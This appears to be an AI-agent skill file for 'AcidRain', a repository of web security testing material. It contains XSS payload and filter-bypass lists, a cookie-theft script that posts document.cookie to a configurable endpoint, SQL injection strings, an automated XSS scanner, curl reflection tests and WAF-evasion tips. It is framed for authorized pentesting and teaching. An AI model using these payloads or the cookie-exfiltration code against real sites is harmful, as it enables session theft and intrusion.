---
name: acidrain-security-testing-scripts
description: Use AcidRain's XSS analysis resources, JavaScript utilities, and PHP injection testing samples for authorized web security research and hands-on learning.
triggers:
  - test for XSS vulnerabilities with AcidRain
  - use AcidRain security scripts for injection testing
  - run AcidRain XSS analysis resources
  - set up AcidRain for web security research
  - demonstrate XSS payloads with AcidRain
  - analyze web application security with AcidRain scripts
  - configure AcidRain for authorized penetration testing
  - explore AcidRain JavaScript and PHP examples
---

# AcidRain Security Testing Scripts

> Skill by [ara.so](https://ara.so) — Security Skills collection.

AcidRain is a web-oriented collection of XSS analysis resources, JavaScript utilities, PHP examples, and injection testing samples designed for authorized security testing, hands-on learning, and controlled research. The project provides browser-side and server-side material organized for security researchers and developers conducting legitimate vulnerability assessments.

## Installation

Clone the repository and navigate to the working directory:

```bash
git clone https://github.com/henry-lewiskpp1107/acidrain-security-script-hub.git
cd acidrain-security-script-hub
```

The repository structure typically includes:

```text
acidrain-security-script-hub/
├── scripts/
│   ├── javascript/     # Client-side XSS and browser scripts
│   ├── php/           # Server-side PHP examples
│   └── xss/           # XSS payloads and injection samples
├── configs/           # Configuration files
├── examples/          # Demonstration code
├── docs/              # Documentation
├── LICENSE
└── README.md
```

## Project Purpose and Scope

AcidRain provides:

- **XSS Analysis Resources**: Payloads, vectors, and test cases for cross-site scripting research
- **JavaScript Utilities**: Client-side scripts for browser-based security exercises
- **PHP Resources**: Server-side examples for testing input validation and output encoding
- **Injection Testing Samples**: Code demonstrating various injection techniques
- **Research Snippets**: Compact, modifiable code fragments for controlled testing

**Critical Authorization Requirement**: Only use these scripts against:
- Applications you own or have explicit permission to test
- Deliberately vulnerable training environments (e.g., DVWA, WebGoat)
- Systems covered by a defined security testing agreement

## JavaScript XSS Resources

### Basic XSS Payload Structure

JavaScript payloads typically follow patterns for testing input reflection and execution context:

```javascript
// Simple alert-based XSS test
<script>alert('XSS')</script>

// Event handler injection
<img src=x onerror=alert('XSS')>

// DOM-based XSS
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">

// URL-based payload
javascript:alert('XSS')
```

### Advanced JavaScript Testing Utilities

```javascript
// Cookie exfiltration test (for authorized testing only)
// scripts/javascript/cookie-exfil-test.js
(function() {
  const cookies = document.cookie;
  const testEndpoint = process.env.TEST_ENDPOINT; // Use environment variable
  
  // Log locally for educational purposes
  console.log('Cookie Test:', cookies);
  
  // In authorized testing, send to your controlled server
  if (testEndpoint) {
    fetch(testEndpoint, {
      method: 'POST',
      body: JSON.stringify({ cookies: cookies }),
      headers: { 'Content-Type': 'application/json' }
    });
  }
})();
```

### DOM Manipulation Analysis

```javascript
// scripts/javascript/dom-xss-scanner.js
/**
 * Identify potential DOM XSS sinks in authorized testing
 */
function scanDOMSinks() {
  const dangerousSinks = [
    'innerHTML',
    'outerHTML',
    'document.write',
    'eval',
    'setTimeout',
    'setInterval'
  ];
  
  const results = [];
  
  // Scan for dangerous DOM operations
  dangerousSinks.forEach(sink => {
    const elements = document.querySelectorAll('*');
    elements.forEach(el => {
      if (el[sink] && typeof el[sink] !== 'function') {
        results.push({
          sink: sink,
          element: el.tagName,
          content: el[sink]
        });
      }
    });
  });
  
  return results;
}

// Usage in browser console during authorized testing
console.log(scanDOMSinks());
```

### Input Reflection Detector

```javascript
// scripts/javascript/reflection-detector.js
/**
 * Test if user input is reflected in page output
 */
function testReflection(payload) {
  const testPayload = payload || `ACIDRAIN_TEST_${Date.now()}`;
  const url = new URL(window.location);
  
  // Test common reflection points
  const reflectionPoints = [
    document.body.innerHTML,
    document.title,
    document.documentElement.outerHTML
  ];
  
  const reflected = reflectionPoints.filter(point => 
    point.includes(testPayload)
  );
  
  return {
    payload: testPayload,
    reflected: reflected.length > 0,
    locations: reflected.length
  };
}

// Test with URL parameter
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.has('test')) {
  console.log(testReflection(urlParams.get('test')));
}
```

## PHP Server-Side Resources

### Input Validation Testing

```php
<?php
// scripts/php/input-validation-test.php
/**
 * Demonstrate vulnerable vs. secure input handling
 * For educational comparison in controlled environments
 */

// VULNERABLE EXAMPLE (for demonstration only)
function vulnerableEcho($input) {
    echo "Vulnerable output: " . $input;
}

// SECURE EXAMPLE (recommended approach)
function secureEcho($input) {
    echo "Secure output: " . htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}

// Test both approaches
$testInput = $_GET['input'] ?? '<script>alert("XSS")</script>';

echo "<h3>Vulnerable Version:</h3>";
// vulnerableEcho($testInput); // Commented for safety

echo "<h3>Secure Version:</h3>";
secureEcho($testInput);
?>
```

### SQL Injection Testing Framework

```php
<?php
// scripts/php/sql-injection-test.php
/**
 * Demonstrate SQL injection vulnerabilities for authorized testing
 * Requires: PDO-enabled PHP with test database
 */

// Database connection using environment variables
$dbHost = getenv('DB_HOST') ?: 'localhost';
$dbName = getenv('DB_NAME') ?: 'test_db';
$dbUser = getenv('DB_USER') ?: 'test_user';
$dbPass = getenv('DB_PASS') ?: '';

try {
    $pdo = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}

// VULNERABLE QUERY (demonstration only)
function vulnerableQuery($pdo, $username) {
    $query = "SELECT * FROM users WHERE username = '$username'";
    // DO NOT USE IN PRODUCTION
    // return $pdo->query($query);
    echo "Vulnerable Query: $query\n";
}

// SECURE QUERY (recommended approach)
function secureQuery($pdo, $username) {
    $query = "SELECT * FROM users WHERE username = :username";
    $stmt = $pdo->prepare($query);
    $stmt->bindParam(':username', $username, PDO::PARAM_STR);
    $stmt->execute();
    return $stmt;
}

// Test input
$testUsername = $_GET['username'] ?? "admin' OR '1'='1";

echo "Testing with input: $testUsername\n\n";
vulnerableQuery($pdo, $testUsername);
$result = secureQuery($pdo, $testUsername);
?>
```

### File Upload Security Testing

```php
<?php
// scripts/php/file-upload-test.php
/**
 * Test file upload security controls
 */

function analyzeUploadSecurity($file) {
    $results = [];
    
    // Check file extension
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
    $fileExtension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $results['extension_check'] = in_array($fileExtension, $allowedExtensions);
    
    // Check MIME type
    $allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    $results['mime_check'] = in_array($mimeType, $allowedMimes);
    
    // Check file size
    $maxSize = 2 * 1024 * 1024; // 2MB
    $results['size_check'] = $file['size'] <= $maxSize;
    
    // Check for double extensions
    $results['double_extension'] = strpos($file['name'], '.') !== strrpos($file['name'], '.');
    
    return $results;
}

// Usage
if ($_FILES['upload']) {
    $analysis = analyzeUploadSecurity($_FILES['upload']);
    print_r($analysis);
}
?>
```

## XSS Payload Collections

### Bypass Techniques

```javascript
// scripts/xss/bypass-techniques.js

// Filter bypass examples for authorized testing
const xssPayloads = {
  // Case variation
  caseVariation: '<ScRiPt>alert("XSS")</sCrIpT>',
  
  // Encoding variations
  htmlEntity: '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  urlEncoded: '%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E',
  doubleEncoded: '%253Cscript%253Ealert(%2522XSS%2522)%253C%252Fscript%253E',
  
  // Null byte injection
  nullByte: '<script\x00>alert("XSS")</script>',
  
  // Comment-based
  commentBreak: '<!--><script>alert("XSS")</script>',
  
  // Event handlers
  eventHandlers: [
    '<img src=x onerror=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<select onfocus=alert("XSS") autofocus>'
  ],
  
  // Protocol handlers
  protocols: [
    '<a href="javascript:alert(\'XSS\')">Click</a>',
    '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',
    '<a href="vbscript:msgbox(\'XSS\')">Click</a>'
  ],
  
  // DOM-based
  domBased: 'window.location.hash.slice(1)',
  
  // Template injection
  templateInjection: '{{7*7}}[[7*7]]'
};

// Export for testing framework
if (typeof module !== 'undefined' && module.exports) {
  module.exports = xssPayloads;
}
```

### Context-Specific Payloads

```javascript
// scripts/xss/context-payloads.js

const contextPayloads = {
  // HTML context
  htmlContext: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>'
  ],
  
  // Attribute context
  attributeContext: [
    '" onmouseover="alert(1)',
    '\' onmouseover=\'alert(1)',
    '"><script>alert(1)</script>'
  ],
  
  // JavaScript context
  jsContext: [
    '\'-alert(1)-\'',
    '\";alert(1);//',
    '</script><script>alert(1)</script>'
  ],
  
  // URL context
  urlContext: [
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'http://example.com?param=<script>alert(1)</script>'
  ],
  
  // CSS context
  cssContext: [
    'expression(alert(1))',
    '</style><script>alert(1)</script>',
    'background:url(javascript:alert(1))'
  ]
};
```

## Configuration and Environment Setup

### Environment Variables

Create a `.env` file for configuration (never commit this file):

```bash
# .env (example - DO NOT commit to repository)

# Testing endpoint for data exfiltration tests
TEST_ENDPOINT=http://localhost:8080/test-receiver

# Database credentials for PHP testing
DB_HOST=localhost
DB_NAME=security_test_db
DB_USER=test_user
DB_PASS=test_password

# Target application (authorized testing only)
TARGET_URL=http://localhost:3000

# Logging
LOG_LEVEL=debug
LOG_FILE=./logs/acidrain.log
```

### PHP Configuration

```php
<?php
// configs/php-config.php
/**
 * Load environment variables for PHP scripts
 */

// Load .env file
if (file_exists(__DIR__ . '/../.env')) {
    $envFile = file(__DIR__ . '/../.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($envFile as $line) {
        if (strpos($line, '#') === 0) continue;
        list($key, $value) = explode('=', $line, 2);
        putenv("$key=$value");
        $_ENV[$key] = $value;
    }
}

// Security headers for test environment
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 0'); // Disabled for testing

// Error reporting for development
error_reporting(E_ALL);
ini_set('display_errors', 1);
?>
```

## Common Testing Patterns

### Automated XSS Scanning Workflow

```javascript
// examples/automated-xss-scan.js
/**
 * Automated XSS testing workflow for authorized targets
 */

const payloads = require('./scripts/xss/bypass-techniques.js');

async function testXSSVulnerability(url, param, payload) {
  const testUrl = `${url}?${param}=${encodeURIComponent(payload)}`;
  
  try {
    const response = await fetch(testUrl);
    const html = await response.text();
    
    // Check if payload is reflected without encoding
    const isReflected = html.includes(payload);
    const isEncoded = html.includes(payload.replace(/</g, '&lt;'));
    
    return {
      url: testUrl,
      payload: payload,
      reflected: isReflected,
      encoded: isEncoded,
      vulnerable: isReflected && !isEncoded
    };
  } catch (error) {
    return { error: error.message };
  }
}

async function scanTarget(targetUrl, parameters) {
  const results = [];
  
  for (const param of parameters) {
    for (const payload of payloads.eventHandlers) {
      const result = await testXSSVulnerability(targetUrl, param, payload);
      results.push(result);
      
      // Rate limiting
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }
  
  return results;
}

// Usage
const targetUrl = process.env.TARGET_URL || 'http://localhost:3000/search';
const testParams = ['q', 'search', 'query', 'name'];

scanTarget(targetUrl, testParams).then(results => {
  const vulnerabilities = results.filter(r => r.vulnerable);
  console.log(`Found ${vulnerabilities.length} potential vulnerabilities`);
  console.log(JSON.stringify(vulnerabilities, null, 2));
});
```

### Manual Testing Workflow

```bash
#!/bin/bash
# examples/manual-test-workflow.sh
# Manual XSS testing workflow script

# Load environment variables
source .env

TARGET="${TARGET_URL:-http://localhost:3000}"
PARAM="${1:-search}"
PAYLOAD="${2:-<script>alert('XSS')</script>}"

echo "Testing XSS on: $TARGET"
echo "Parameter: $PARAM"
echo "Payload: $PAYLOAD"

# URL encode the payload
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")

# Test GET request
echo -e "\n[*] Testing GET request..."
curl -s "${TARGET}?${PARAM}=${ENCODED}" | grep -o "$PAYLOAD" && echo "[!] Reflected!" || echo "[*] Not reflected"

# Test POST request
echo -e "\n[*] Testing POST request..."
curl -s -X POST -d "${PARAM}=${ENCODED}" "$TARGET" | grep -o "$PAYLOAD" && echo "[!] Reflected!" || echo "[*] Not reflected"

# Test with different encodings
echo -e "\n[*] Testing with double encoding..."
DOUBLE_ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('$PAYLOAD')))")
curl -s "${TARGET}?${PARAM}=${DOUBLE_ENCODED}" | grep -o "$PAYLOAD" && echo "[!] Reflected!" || echo "[*] Not reflected"
```

## Troubleshooting

### Payloads Not Executing

**Problem**: XSS payloads are reflected but not executing in the browser.

**Solutions**:
- Check if Content-Security-Policy (CSP) headers are blocking execution
- Verify the context (HTML, attribute, JavaScript) matches your payload
- Test different encoding methods (URL, HTML entities, Unicode)
- Use browser developer tools to inspect how the payload is rendered

```javascript
// Check CSP headers
fetch(window.location.href)
  .then(response => {
    const csp = response.headers.get('Content-Security-Policy');
    console.log('CSP:', csp);
  });

// Identify execution context
function identifyContext(payload) {
  const testString = `ACIDRAIN_${Date.now()}`;
  document.body.innerHTML += testString;
  
  const inHTML = document.body.innerHTML.includes(testString);
  const inJS = document.scripts.length > 0;
  
  return { inHTML, inJS };
}
```

### PHP Scripts Not Running

**Problem**: PHP scripts return blank pages or errors.

**Solutions**:
- Verify PHP is installed: `php -v`
- Check PHP error logs: `tail -f /var/log/php_errors.log`
- Enable error display in development:

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/php_errors.log');
?>
```

- Ensure proper file permissions: `chmod 644 script.php`
- Verify database connectivity if using PDO

### Environment Variables Not Loading

**Problem**: Scripts cannot access environment variables.

**Solutions**:

```bash
# Verify .env file exists and has correct format
cat .env

# Load variables in current shell
export $(cat .env | xargs)

# Verify variables are set
echo $TARGET_URL
```

```php
<?php
// PHP: Check if variables are loaded
var_dump(getenv('TARGET_URL'));
var_dump($_ENV['TARGET_URL']);
?>
```

```javascript
// Node.js: Use dotenv package
require('dotenv').config();
console.log(process.env.TARGET_URL);
```

### Rate Limiting or Blocking

**Problem**: Automated scans are being blocked by WAF or rate limiting.

**Solutions**:
- Add delays between requests
- Rotate user agents
- Use session management
- Respect robots.txt and rate limits

```javascript
// Add rate limiting to automated scans
async function rateLimitedRequest(url, delayMs = 1000) {
  await new Promise(resolve => setTimeout(resolve, delayMs));
  return fetch(url, {
    headers: {
      'User-Agent': 'AcidRain Security Research (Authorized Testing)'
    }
  });
}
```

## Best Practices

1. **Authorization First**: Always obtain explicit written permission before testing any system you don't own

2. **Isolated Environments**: Set up local vulnerable applications (DVWA, bWAPP) for practice

3. **Documentation**: Keep detailed notes of testing methodology and findings

4. **Scope Management**: Define clear boundaries for what systems and attack vectors are authorized

5. **Responsible Disclosure**: Report vulnerabilities through proper channels with sufficient detail

6. **Code Review**: Understand each script before execution; never run untrusted code blindly

7. **Environment Separation**: Use environment variables for configuration, never hardcode credentials

8. **Version Control**: Never commit sensitive data, credentials, or testing results to public repositories

---

**Legal Notice**: The AcidRain scripts are provided for educational purposes and authorized security research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security testing.
